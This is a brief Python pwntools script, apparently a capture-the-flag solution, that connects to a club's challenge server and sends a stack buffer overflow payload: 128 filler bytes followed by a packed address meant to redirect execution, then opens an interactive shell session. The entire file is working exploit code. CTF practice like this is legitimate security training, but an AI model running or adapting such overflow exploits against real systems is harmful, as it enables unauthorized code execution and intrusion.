from pwn import *

io = connect("nex-zero.nexus-security-club.com",4123)
#io = process('../src/main_100')
pause()
io.sendline(b'a'*128+p64(0x0000000000482860))


io.interactive()
io.close()